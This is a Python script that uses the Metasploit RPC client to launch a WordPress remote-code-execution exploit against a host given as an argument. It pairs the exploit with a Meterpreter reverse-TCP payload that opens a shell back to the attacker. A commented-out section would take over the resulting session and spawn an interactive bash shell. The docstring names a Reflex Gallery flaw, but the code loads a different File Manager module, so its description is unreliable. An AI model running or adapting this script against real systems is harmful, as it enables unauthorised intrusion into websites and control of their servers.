#!/usr/bin/python3

"""
This module exploits an arbitrary PHP code upload in the WordPress 
Reflex Gallery version 3.1.3. The vulnerability allows for arbitrary 
file upload and remote code execution.
"""

from pymetasploit3.msfrpc import MsfRpcClient
import sys
from config import *

client=MsfRpcClient(PWD, port=55552)
exploit = client.modules.use('exploit', 'multi/http/wp_file_manager_rce') 
print(exploit.description)
exploit['RHOSTS']=sys.argv[1]
exploit['RPORT']=80
exploit['TARGETURI']='/wordpress'
payload = client.modules.use('payload', 'php/meterpreter/reverse_tcp')
payload['LHOST']= LHOST
payload['LPORT']= LPORT
var = exploit.execute(payload=payload)
print(var)
if var['job_id']==None:
    print("Exploit fallito")
else:
    print("Exploit riuscito")
    """while len(client.sessions.list)==0:
        print('No session active')
    session = client.sessions.list
    for s in session.keys():
        print(s)
        shell = client.sessions.session(s)
        print(shell)
        shell.write('shell')
        print(shell.read())
        shell.write("python3 -c 'import pty;pty.spawn('/bin/bash')'")
        print(shell.read())"""
        






